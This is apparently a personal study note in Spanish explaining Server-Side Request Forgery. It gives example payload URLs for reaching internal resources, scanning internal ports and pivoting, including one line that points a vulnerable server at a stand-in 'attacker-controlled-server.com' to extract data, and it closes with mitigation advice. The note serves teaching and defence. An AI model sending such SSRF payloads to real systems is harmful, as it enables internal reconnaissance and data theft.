___

- Tags: 

___

# Introducción

Server-Side Request Forgery (**SSRF**) es una vulnerabilidad de seguridad que permite a un atacante forzar al servidor a realizar solicitudes [[HTTP]] desde dentro del sistema, lo que puede resultar en ataques contra recursos internos y externos.

____
# Ejemplos de URLs Vulnerables

- **Caso 1: Acceso a recursos internos**

  ```plaintext
  http://vulnerable-website.com/api/fetch?url=http://internal-resource.com/secret
  ```

- **Caso 2: Escaneo de puertos internos**

  ```plaintext
  http://vulnerable-website.com/api/fetch?url=http://internal-server:22
  ```

___
# Pivoting en SSRF

**SSRF** también puede ser utilizado para realizar ataques de pivoting, permitiendo al atacante acceder a otros servicios y recursos a través del servidor comprometido.

### Ejemplo de Pivoting

1. **Solicitud Maliciosa Inicial**

   ```plaintext
   http://vulnerable-website.com/api/fetch?url=http://internal-service.com/data
   ```

2. **Utilizando el SSRF para Acceder a una Base de Datos**

   ```plaintext
   http://vulnerable-website.com/api/fetch?url=mysql://attacker-controlled-server.com:3306/extract_data
   ```

3. **Exfiltración de Datos**
   
   Una vez que se ha establecido la conexión a la base de datos, el atacante puede extraer datos sensibles.

____
# Medidas de Mitigación

- Validar y filtrar las entradas del usuario.
- Restringir las solicitudes a direcciones [[Dirección IP|IP]] y recursos específicos.
- Utilizar listas blancas en lugar de listas negras para las direcciones permitidas.

